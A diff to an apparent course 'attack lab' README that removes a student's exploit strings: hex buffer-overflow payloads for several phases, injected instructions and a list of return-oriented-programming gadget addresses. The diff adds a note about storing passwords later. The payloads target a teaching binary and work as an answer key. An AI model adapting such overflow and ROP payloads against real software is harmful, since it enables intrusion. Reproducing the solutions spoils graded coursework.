@@ -105,56 +105,10 @@ and info are your friends. In particular, man ascii might come in useful. info g
 more than you ever wanted to know about the GNU Assembler. Also, the web may also be a treasure trove
 of information. If you get stumped, feel free to ask your instructor for help.
 
-No good way to archive the work I did for this lab but here are the exploits I came up with:
-1:11 11 11 11 11 11 11 11
-  11 11 11 11 11 11 11 11
-  11 11 11 11 11 11 11 11 
-  69 18 40 00 00 00 00 00
-2:48 c7 c7 7c 74 93 1b c3       
-  00 00 00 00 00 00 00 00  
-  00 00 00 00 00 00 00 00
-  28 49 62 55 00 00 00 00
-  95 18 40 00 00 00 00 00
-2alt: 48 c7 c7 7c 74 93 1b
-      68 95 18 40 00  
-      c3 
-      00 00 00 00 00 00 00 00 00 00 00 
-      28 49 62 55 00 00 00 00
-3:48 c7 c7 50 49 62 55 c3  
-  00 00 00 00 00 00 00 00
-  00 00 00 00 00 00 00 00
-  28 49 62 55 00 00 00 00
-  6a 19 40 00 00 00 00 00
-  31 62 39 33 37 34 37 63
-4:00 00 00 00 00 00 00 00
-  00 00 00 00 00 00 00 00
-  00 00 00 00 00 00 00 00
-  fb 19 40 00 00 00 00 00
-  7c 74 93 1b 00 00 00 00
-  00 1A 40 00 00 00 00 00   
-  95 18 40 00 00 00 00 00
-gadgets:
-exp4
 
-gadg1 = 4019f8
 
-gadg2 = 4019fe
 
-exp5
 
-gadg1= 40 1b 09 /move rsp tp rax
 
-gadg2= 40 1a 00 /nov rax to rdi
 
-gadg3= 40 1a 22 /pop rax
-
-gadg4= 40 1a e9 /e
-
-gadg5= 40 1b 03 /e
-
-gadg6= 40 1a b3 /e
-
-gadg7= 40 1a 33 // addxy/lea
-
-gadg8= 
-
+note to self to put the passwords here eventually 
